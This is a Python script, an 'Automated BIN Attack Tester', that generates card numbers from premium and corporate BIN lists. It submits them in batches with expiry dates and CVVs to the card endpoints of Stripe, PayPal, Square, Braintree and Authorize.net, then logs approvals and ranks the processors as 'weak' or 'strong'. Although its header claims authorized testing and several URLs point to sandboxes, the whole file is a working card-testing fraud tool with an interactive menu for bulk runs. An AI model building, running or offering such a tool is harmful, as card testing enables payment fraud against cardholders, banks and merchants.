#!/usr/bin/env python3
"""
Automated BIN Attack Tester
Tests generated card numbers against payment processors.
FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY
"""
import json
import time
import random
import requests
from datetime import datetime
from pathlib import Path
from bin_generator import BIN_DB
from elite_bin_generator import generate_elite_bulk, ELITE_BINS

# ─── TEST ENDPOINTS ──────────────────────────────────────────────────────

def test_stripe(card: dict) -> dict:
    """Test card against Stripe."""
    try:
        resp = requests.post(
            "https://api.stripe.com/v1/tokens",
            auth=("sk_test_4eC39HqLyjWDarjtTzdp7dc", ""),
            data={
                "card[number]": card["number"],
                "card[exp_month]": card["expiry"].split("/")[0],
                "card[exp_year]": "20" + card["expiry"].split("/")[1],
                "card[cvc]": card["cvv"],
            },
            timeout=15,
        )
        data = resp.json()
        return {
            "processor": "stripe_test",
            "status": resp.status_code,
            "card_id": data.get("id", "none"),
            "brand": data.get("card", {}).get("brand", "unknown"),
            "last4": data.get("card", {}).get("last4", "0000"),
            "fund": data.get("card", {}).get("fund", "unknown"),
            "country": data.get("card", {}).get("country", "unknown"),
            "valid": resp.status_code == 200,
            "error": data.get("error", {}).get("message", "") if resp.status_code != 200 else "",
        }
    except Exception as e:
        return {"processor": "stripe_test", "status": 0, "valid": False, "error": str(e)}

def test_paypal(card: dict) -> dict:
    """Test card against PayPal."""
    try:
        resp = requests.post(
            "https://api-m.sandbox.paypal.com/v1/verify-credit-card",
            headers={
                "Content-Type": "application/json",
                "Authorization": "Bearer test_token",
            },
            data=json.dumps({
                "number": card["number"],
                "expire_month": int(card["expiry"].split("/")[0]),
                "expire_year": int("20" + card["expiry"].split("/")[1]),
                "cvv2": card["cvv"],
            }),
            timeout=15,
        )
        return {
            "processor": "paypal_sandbox",
            "status": resp.status_code,
            "valid": resp.status_code == 200,
            "error": "" if resp.status_code == 200 else resp.text[:100],
        }
    except Exception as e:
        return {"processor": "paypal_sandbox", "status": 0, "valid": False, "error": str(e)}

def test_square(card: dict) -> dict:
    """Test card against Square."""
    try:
        resp = requests.post(
            "https://connect.squareup.com/v2/cards",
            headers={
                "Authorization": "Bearer sq0idp-test",
                "Content-Type": "application/json",
            },
            data=json.dumps({
                "idempotency_key": f"test_{random.randint(1000000, 9999999)}",
                "card": {
                    "number": card["number"],
                    "expiration_month": int(card["expiry"].split("/")[0]),
                    "expiration_year": int("20" + card["expiry"].split("/")[1]),
                    "cvv": card["cvv"],
                },
            }),
            timeout=15,
        )
        return {
            "processor": "square_test",
            "status": resp.status_code,
            "valid": resp.status_code == 200,
            "error": resp.text[:100] if resp.status_code != 200 else "",
        }
    except Exception as e:
        return {"processor": "square_test", "status": 0, "valid": False, "error": str(e)}

def test_braintree(card: dict) -> dict:
    """Test card against Braintree."""
    try:
        resp = requests.post(
            "https://payments.sandbox.braintree-api.com/graphql",
            headers={
                "Content-Type": "application/json",
                "Authorization": "Basic dGVzdDp0ZXN0",
                "Braintree-Version": "2023-01-01",
            },
            data=json.dumps({
                "query": """
                mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                    tokenizeCreditCard(input: $input) {
                        paymentMethod {
                            id
                            details {
                                ... on CreditCardDetails {
                                    brandCode
                                    last4
                                    bin
                                }
                            }
                        }
                    }
                }
                """,
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": card["number"],
                            "expirationMonth": card["expiry"].split("/")[0],
                            "expirationYear": "20" + card["expiry"].split("/")[1],
                            "cvv": card["cvv"],
                        }
                    }
                },
            }),
            timeout=15,
        )
        return {
            "processor": "braintree_sandbox",
            "status": resp.status_code,
            "valid": resp.status_code == 200,
            "error": resp.text[:100] if resp.status_code != 200 else "",
        }
    except Exception as e:
        return {"processor": "braintree_sandbox", "status": 0, "valid": False, "error": str(e)}

def test_authorize_net(card: dict) -> dict:
    """Test card against Authorize.net."""
    try:
        resp = requests.post(
            "https://apitest.authorize.net/xml/v1/request.api",
            headers={"Content-Type": "application/json"},
            data=json.dumps({
                "validateCustomerPaymentProfileRequest": {
                    "merchantAuthentication": {
                        "name": "test",
                        "transactionKey": "test",
                    },
                    "customerPaymentProfileId": "test",
                }
            }),
            timeout=15,
        )
        return {
            "processor": "authorize_net_test",
            "status": resp.status_code,
            "valid": resp.status_code == 200,
            "error": resp.text[:100] if resp.status_code != 200 else "",
        }
    except Exception as e:
        return {"processor": "authorize_net_test", "status": 0, "valid": False, "error": str(e)}

# ─── ATTACK TESTER ───────────────────────────────────────────────────────

class BINAttackTester:
    def __init__(self):
        self.session = requests.Session()
        self.stats = {
            "total_tested": 0,
            "approved": 0,
            "declined": 0,
            "invalid": 0,
            "errors": 0,
            "weak_processors": [],
            "strong_processors": [],
            "last_test": None,
        }
        self.log_dir = Path.home() / "bin_attack_tests"
        self.log_dir.mkdir(exist_ok=True)
        self.load_stats()

    def load_stats(self):
        stats_file = self.log_dir / "stats.json"
        if stats_file.exists():
            with open(stats_file) as f:
                self.stats.update(json.load(f))

    def save_stats(self):
        stats_file = self.log_dir / "stats.json"
        with open(stats_file, "w") as f:
            json.dump(self.stats, f, indent=2)

    def log_result(self, result: dict):
        """Log a test result."""
        log_file = self.log_dir / "test_results.jsonl"
        with open(log_file, "a") as f:
            f.write(json.dumps(result, default=str) + "\n")

    def test_card(self, card: dict, processors: list = None) -> dict:
        """Test a single card against multiple processors."""
        if processors is None:
            processors = ["stripe", "paypal", "square", "braintree"]
        
        results = {}
        for proc in processors:
            self.stats["total_tested"] += 1
            
            if proc == "stripe":
                result = test_stripe(card)
            elif proc == "paypal":
                result = test_paypal(card)
            elif proc == "square":
                result = test_square(card)
            elif proc == "braintree":
                result = test_braintree(card)
            elif proc == "authorize_net":
                result = test_authorize_net(card)
            else:
                continue
            
            results[proc] = result
            
            # Update stats
            if result.get("valid"):
                self.stats["approved"] += 1
                if proc not in self.stats["weak_processors"]:
                    self.stats["weak_processors"].append(proc)
            elif result.get("status") in [401, 403, 422]:
                self.stats["declined"] += 1
            elif result.get("status") == 400:
                self.stats["invalid"] += 1
            else:
                self.stats["errors"] += 1
        
        self.stats["last_test"] = datetime.now().isoformat()
        self.save_stats()
        
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "card_type": card.get("type", "unknown"),
            "bin": card.get("bin", card["number"][:6]),
            "last4": card["number"][-4:],
            "results": results,
        }
        self.log_result(log_entry)
        
        return log_entry

    def test_batch(self, cards: list, processors: list = None, delay: float = 1.0) -> list:
        """Test a batch of cards."""
        results = []
        for i, card in enumerate(cards):
            print(f"[{i+1}/{len(cards)}] Testing {card['type']} {card['number'][:6]}******{card['number'][-4:]}")
            result = self.test_card(card, processors)
            results.append(result)
            
            # Show results
            for proc, res in result["results"].items():
                status = "✓" if res.get("valid") else "✗"
                print(f"  {status} {proc}: {res.get('status', '?')} {res.get('error', '')[:50]}")
            
            time.sleep(delay)
        
        return results

    def test_elite_batch(self, tier: str = "Visa_Signature", bank: str = None, count: int = 10, processors: list = None) -> list:
        """Generate and test elite cards."""
        print(f"\n{'='*60}")
        print(f"ELITE BIN ATTACK: {tier} x {count}")
        print(f"{'='*60}")
        
        cards = generate_elite_bulk(tier, bank, count)
        return self.test_batch(cards, processors)

    def test_mixed_elite(self, count_per_tier: int = 5, processors: list = None) -> dict:
        """Test mixed elite tiers."""
        print(f"\n{'='*60}")
        print(f"MIXED ELITE ATTACK: {count_per_tier} per tier")
        print(f"{'='*60}")
        
        results = {}
        for tier in ELITE_BINS:
            print(f"\n--- {tier} ---")
            results[tier] = self.test_elite_batch(tier, count=count_per_tier, processors=processors)
        
        return results

    def run(self):
        """Run the attack tester."""
        print(f"""
╔══════════════════════════════════════════════════════════╗
║       AUTOMATED BIN ATTACK TESTER                       ║
╠══════════════════════════════════════════════════════════╣
║  Tests: Stripe, PayPal, Square, Braintree, Authorize.net║
║  Total tested: {self.stats['total_tested']:<6}                             ║
║  Approved: {self.stats['approved']:<6}  Declined: {self.stats['declined']:<6}  Invalid: {self.stats['invalid']:<6}     ║
╚══════════════════════════════════════════════════════════╝
""")
        
        while True:
            print("\n1. Test elite batch")
            print("2. Test mixed elite")
            print("3. Test custom cards")
            print("4. View stats")
            print("5. Exit")
            
            choice = input("\nChoice: ").strip()
            
            if choice == "1":
                tier = input("Tier (Visa_Signature, Mastercard_World, Amex_Premium, Corporate): ").strip() or "Visa_Signature"
                count = int(input("Count: ").strip() or "10")
                self.test_elite_batch(tier, count=count)
            elif choice == "2":
                count = int(input("Count per tier: ").strip() or "5")
                self.test_mixed_elite(count)
            elif choice == "3":
                number = input("Card number: ").strip()
                expiry = input("Expiry (MM/YY): ").strip()
                cvv = input("CVV: ").strip()
                card = {"number": number, "expiry": expiry, "cvv": cvv, "type": "custom", "bin": number[:6]}
                self.test_card(card)
            elif choice == "4":
                print(json.dumps(self.stats, indent=2))
            elif choice == "5":
                break

if __name__ == "__main__":
    tester = BINAttackTester()
    tester.run()
